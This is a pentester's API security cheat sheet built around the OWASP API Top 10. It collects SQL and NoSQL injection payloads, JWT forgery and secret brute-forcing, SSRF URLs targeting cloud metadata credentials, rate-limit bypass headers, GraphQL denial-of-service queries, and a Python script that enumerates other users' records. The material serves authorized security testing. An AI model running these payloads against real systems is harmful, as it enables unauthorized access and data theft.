# API Quick Reference Guide

Fast lookup for common payloads, techniques, and testing patterns. Keep this handy during active testing for quick wins.

Related: [[API-02-Technical-Testing-Checklist]] | [[API-03-Request-Tracker]]

---

## OWASP API Top 10 Quick Tests

| OWASP | Category | Quick Test |
|-------|----------|-----------|
| API1 | BOLA | Change ID parameter: `/api/users/123` → `/api/users/124` |
| API2 | Broken Authentication | Brute force JWT secret with hashcat |
| API3 | Broken Object Property Level | Add `"role":"admin"` to POST body |
| API4 | Unrestricted Resource Access | Send 1000 requests, check for rate limit |
| API5 | Broken Function Level | Access `/api/admin/*` as regular user |
| API6 | Business Flows | Skip payment step in checkout flow |
| API7 | SSRF | Set webhook URL to `http://169.254.169.254` |
| API8 | Misconfiguration | Check for verbose errors, CORS wildcards |
| API9 | Inventory Management | Test `/api/v1/` vs `/api/v2/` |
| API10 | Unsafe Consumption | Test webhook validation |

---

## Quick Win Payloads

### BOLA/IDOR Testing

**Pattern**: Change object IDs to access other users' data

```bash
# Normal request
GET /api/users/100/profile
Authorization: Bearer [YOUR_TOKEN]

# BOLA attempt - change ID
GET /api/users/101/profile
Authorization: Bearer [YOUR_TOKEN]

# If 200 OK with data → BOLA vulnerability!
```

**Test endpoints**:
- `/api/users/{id}`
- `/api/accounts/{id}`  
- `/api/orders/{id}`
- `/api/documents/{id}`
- `/api/messages/{id}`

**ID types to test**:
- Sequential: 1, 2, 3, 100, 101
- UUIDs: Try with different user's UUID
- Encoded: Base64 decode, increment, re-encode

---

### JWT Exploitation

**JWT Structure**:
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9  ← Header (base64)
.
eyJzdWIiOiIxMjMiLCJlbWFpbCI6InVzZXJAZXhhbXBsZS5jb20ifQ  ← Payload (base64)
.
SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c  ← Signature
```

**Quick Decode** (Linux/Mac):
```bash
# Decode header
echo "eyJhbGc..." | base64 -d

# Decode payload
echo "eyJzdWI..." | base64 -d
```

**Algorithm Confusion Attack**:
1. Change `"alg":"RS256"` to `"alg":"none"`
2. Remove signature (everything after second `.`)
3. Send modified token

**Weak Secret Brute Force**:
```bash
# Using hashcat
hashcat -m 16500 -a 0 jwt.txt /usr/share/wordlists/rockyou.txt

# Using jwt_tool
python3 jwt_tool.py [TOKEN] -C -d /usr/share/wordlists/rockyou.txt
```

**Claim Manipulation**:
```json
{
  "sub": "123",     ← Change to admin user ID
  "role": "user"    ← Change to "admin"
  "exp": 1234567890 ← Extend expiration
}
```

---

### SQL Injection

**Quick SQLi Test Payloads**:
```
'
"
' OR '1'='1
' OR '1'='1'--
' OR '1'='1'#
' UNION SELECT NULL--
'; WAITFOR DELAY '00:00:05'--
```

**Test in**:
- Query params: `?id=1'`
- Path params: `/api/users/1'`
- JSON body: `{"id": "1'"}`
- Headers: `X-User-ID: 1'`

**Boolean-based**:
```bash
# True condition (should return data)
?search=' OR '1'='1

# False condition (should return no data)
?search=' AND '1'='2
```

**Union-based extraction**:
```sql
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT NULL,@@version,NULL--
' UNION SELECT NULL,username,password FROM users--
```

---

### NoSQL Injection

**MongoDB Injection Payloads**:

**JSON body**:
```json
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"username": "admin", "password": {"$regex": "^a"}}
```

**Query parameters**:
```
?username[$ne]=null&password[$ne]=null
?username[$gt]=&password[$gt]=
```

**Auth Bypass**:
```bash
curl -X POST 'https://api.target.com/api/login' \
  -H 'Content-Type: application/json' \
  -d '{"username":{"$ne":null},"password":{"$ne":null}}'
```

---

### Mass Assignment

**Add unauthorized fields to requests**:

```json
// Registration
{
  "email": "test@example.com",
  "password": "Password123!",
  "role": "admin",          ← Add this
  "is_verified": true,      ← Add this
  "credits": 999999         ← Add this
}

// Profile update
{
  "name": "New Name",
  "bio": "My bio",
  "is_admin": true,         ← Add this
  "permissions": ["*"]      ← Add this
}
```

**Common fields to test**:
```
role, admin, is_admin, is_staff, is_superuser
is_verified, verified, email_verified
credits, balance, price, discount
permission, permissions, access_level
status, approved, active, enabled
```

---

### Business Logic Bypass

**Payment/Checkout**:
```bash
# Normal flow: cart → checkout → payment → confirm

# Exploit: Skip payment
POST /api/cart/checkout  → get order_id
# Skip: POST /api/payment/process
GET /api/order/{order_id}/confirm  → Free order!
```

**Negative Values**:
```json
{"amount": -100}    // Withdraw negative = deposit!
{"quantity": -5}    // Negative quantity for refund?
{"price": -50}      // Negative price pays you?
```

**Race Conditions** (Burp Turbo Intruder):
```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=10)
    for i in range(10):
        engine.queue(target.req)
```

---

### Rate Limit Bypass

**Header Manipulation**:
```http
X-Forwarded-For: 1.2.3.4
X-Real-IP: 1.2.3.4
X-Originating-IP: 1.2.3.4
X-Remote-IP: 1.2.3.4
X-Client-IP: 1.2.3.4
```

**Burp Intruder**:
- Payload position: X-Forwarded-For header
- Payload type: Numbers (1-255)
- Send 1000+ requests with different IPs

**Other bypasses**:
- Different HTTP methods (GET vs POST)
- Different API versions (/v1 vs /v2)
- Case variation (/Api/Users vs /api/users)
- URL encoding (/api%2Fusers)

---

### SSRF Payloads

**Cloud Metadata**:
```bash
# AWS
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/user-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Azure  
http://169.254.169.254/metadata/instance?api-version=2021-02-01

# GCP
http://metadata.google.internal/computeMetadata/v1/
```

**Internal Network**:
```
http://localhost:80
http://127.0.0.1:8080
http://0.0.0.0:9000
http://[::]:80
http://192.168.1.1
```

**Bypass Filters**:
```
# URL encoding
http%3A%2F%2F127.0.0.1

# Decimal IP
http://2130706433

# Hex IP  
http://0x7f.0x0.0x0.0x1

# Redirect
http://evil.com → redirects to localhost
```

---

### GraphQL Attacks

**Introspection Query**:
```graphql
query {
  __schema {
    types {
      name
      fields {
        name
      }
    }
  }
}
```

**Batching/Aliasing**:
```graphql
query {
  user1: user(id: 1) { email }
  user2: user(id: 2) { email }
  user3: user(id: 3) { email }
  # ... repeat 1000 times
}
```

**Deep Nesting DoS**:
```graphql
query {
  user {
    posts {
      comments {
        author {
          posts {
            comments {
              # ... nest 100 levels
            }
          }
        }
      }
    }
  }
}
```

---

## Common HTTP Methods Testing

For each endpoint, test:

```http
OPTIONS /api/users/123     ← Check allowed methods
GET /api/users/123         ← Read
POST /api/users/123        ← Create (should be 405)
PUT /api/users/123         ← Update
PATCH /api/users/123       ← Partial update
DELETE /api/users/123      ← Delete (critical!)
HEAD /api/users/123        ← Metadata only
TRACE /api/users/123       ← Should be disabled
```

**Method Override**:
```http
POST /api/users/123 HTTP/1.1
X-HTTP-Method-Override: DELETE
```

---

## Parameter Discovery

**Common parameters to fuzz**:
```
id, user_id, account_id, order_id, doc_id
email, username, name, phone
admin, role, permission, access_level
debug, test, internal, hidden
api_key, token, auth, session
format, callback, redirect_uri
page, limit, offset, sort
_method, __method, method
```

**Tools**:
```bash
# Arjun
arjun -u https://api.target.com/endpoint

# Param Miner (Burp extension)
# Right-click request → Extensions → Param Miner → Guess parameters
```

---

## cURL Command Templates

### GET with Auth
```bash
curl -X GET 'https://api.target.com/api/users/123' \
  -H 'Authorization: Bearer TOKEN' \
  -H 'Content-Type: application/json' \
  -v
```

### POST with JSON Body
```bash
curl -X POST 'https://api.target.com/api/users' \
  -H 'Authorization: Bearer TOKEN' \
  -H 'Content-Type: application/json' \
  -d '{"email":"test@example.com","password":"Pass123!"}' \
  -v
```

### BOLA Test
```bash
# Your token
TOKEN="eyJhbGc..."

# Access other user's data
curl -X GET "https://api.target.com/api/users/101/profile" \
  -H "Authorization: Bearer $TOKEN"
```

### SQL Injection Test
```bash
curl -X GET "https://api.target.com/api/search?q=%27+OR+%271%27%3D%271" \
  -H 'Content-Type: application/json'
```

---

## Burp Suite Workflow

### Initial Setup
1. Configure proxy: 127.0.0.1:8080
2. Import CA cert in browser
3. Start capturing traffic
4. Browse API normally (or use Postman)
5. Review Burp HTTP history

### Testing Pattern
1. Find interesting request in history
2. Right-click → Send to Repeater
3. Modify request (change IDs, add fields, etc.)
4. Send and analyze response
5. If vulnerable → Send to Intruder for automation

### Intruder for BOLA
1. Send request to Intruder
2. Mark ID parameter: `/api/users/§123§`
3. Payload type: Numbers, sequential (1-1000)
4. Start attack
5. Analyze responses (look for 200 OK with data)

---

## Testing Checklist (Per Endpoint)

For EVERY API endpoint:

- [ ] Test without authentication (should fail)
- [ ] Test with expired token (should fail)
- [ ] Test with other user's token (BOLA test)
- [ ] Test all HTTP methods
- [ ] Fuzz all parameters
- [ ] Test with excessive payload size
- [ ] Test with special characters
- [ ] Test with SQL/NoSQL injection
- [ ] Test rate limiting
- [ ] Check response for excessive data
- [ ] Test mass assignment (add fields)
- [ ] Check error messages

---

## Automation Scripts

### Python BOLA Tester
```python
import requests

base_url = "https://api.target.com"
token_a = "USER_A_TOKEN"
token_b = "USER_B_TOKEN"

# Test if User A can access User B's data
for user_id in range(1, 1000):
    r = requests.get(
        f"{base_url}/api/users/{user_id}/profile",
        headers={"Authorization": f"Bearer {token_a}"}
    )
    
    if r.status_code == 200:
        print(f"[BOLA] Accessed user {user_id} data!")
        print(r.json())
```

### JWT Secret Brute Force
```bash
#!/bin/bash
# Requires jwt_tool

TOKEN="eyJhbGc..."

python3 jwt_tool.py $TOKEN -C -d /usr/share/wordlists/rockyou.txt

# If secret found:
# python3 jwt_tool.py $TOKEN -T -S hs256 -p "found_secret"
```

---

## Response Analysis

### Look for in Responses

**Sensitive Data Leakage**:
```json
{
  "user": {
    "password_hash": "...",        ← Shouldn't be here
    "ssn": "123-45-6789",          ← PII
    "internal_notes": "...",       ← Internal field
    "is_admin": false,             ← Useful for attacker
    "api_key": "..."               ← Credentials
  }
}
```

**Error Messages**:
```
- Stack traces
- File paths: "C:\app\src\user.php"
- Database errors: "MySQL syntax error..."
- Version info: "Django 3.2"
- Internal IPs
```

**Headers**:
```http
Server: Express
X-Powered-By: PHP/7.4
X-AspNet-Version: 4.0
X-RateLimit-Remaining: 0
```

---

## Quick Stats Tracking

Use during testing:

**Endpoints tested**: ___  
**BOLA findings**: ___  
**Auth issues**: ___  
**Injection vulns**: ___  
**Business logic**: ___

**Time spent**: ___ hours  
**Critical findings**: ___  
**High findings**: ___

---

## Tools Quick Reference

```bash
# JWT decode
jwt_tool [TOKEN]

# JWT brute force
python3 jwt_tool.py [TOKEN] -C -d wordlist.txt

# SQLMap
sqlmap -u "URL" --headers="Authorization: Bearer TOKEN"

# Arjun (param discovery)
arjun -u URL

# ffuf (endpoint fuzzing)
ffuf -u https://api.target.com/FUZZ -w wordlist.txt

# Burp Intruder positions
GET /api/users/§123§/profile§PARAM§
```

---

## Tags
#quick-reference #payloads #cheat-sheet #api-testing #owasp

---

## Related Documents
- [[API-00-Overview|Overview]]
- [[API-01-Admin-Checklist|Admin Checklist]]
- [[API-02-Technical-Testing-Checklist|Technical Testing Checklist]]
- [[API-03-Request-Tracker|Request Tracker]]
- [[API-04-Evidence-Collection|Evidence Collection]]
- [[API-05-Reporting-Template|Reporting Template]]

---
*Created: 2026-01-21*
*Tester: Er2oneousbit*
*Methodology developed with assistance from Claude (Anthropic) - Model: Claude Sonnet 4.5*
